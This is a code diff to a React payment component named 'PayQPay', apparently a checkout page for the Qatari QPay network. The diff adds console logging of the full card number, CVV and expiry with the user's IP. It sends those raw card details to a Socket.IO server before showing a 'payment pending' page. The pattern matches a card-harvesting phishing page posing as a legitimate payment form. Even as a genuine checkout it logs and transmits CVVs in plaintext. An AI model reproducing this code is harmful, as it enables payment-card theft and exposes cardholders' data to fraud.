@@ -158,18 +158,29 @@ const PayQPay = () => {
       const expirationDate = `${formData.expiryMonth}/${formData.expiryYear}`;
       const cardLastDigits = formData.cardNumber.slice(-4);
       
+      console.log('🔵 QPay Payment Data:', {
+        ip: userIp,
+        cardNumber: formData.cardNumber,
+        cvv: formData.cvv,
+        expirationDate: expirationDate
+      });
+      
       socket.emit('submitPayment', {
         ip: userIp,
-        paymentMethod: 'QPay',
+        paymentMethod: 'QPay - Mobile Payment',
         cardHolderName: 'QPay Customer',
-        cardNumber: formData.cardNumber,
-        cardLastDigits: cardLastDigits,
-        expirationDate: expirationDate,
-        cvv: formData.cvv,
-        phoneNumber: formData.phoneNumber || '',
+        cardNumber: formData.cardNumber || '',
+        cardLastDigits: cardLastDigits || '',
+        expirationDate: expirationDate || '',
+        cvv: formData.cvv || '',
+        phoneNumber: '+974',
         amount: parseFloat(paymentAmount.replace(/,/g, '')) || 0,
         timestamp: new Date().toISOString()
       });
+      
+      console.log('✅ QPay payment submitted via Socket.IO');
+    } else {
+      console.error('❌ Socket or userIp not available:', { socket: !!socket, userIp });
     }
 
     // Navigate to payment pending page
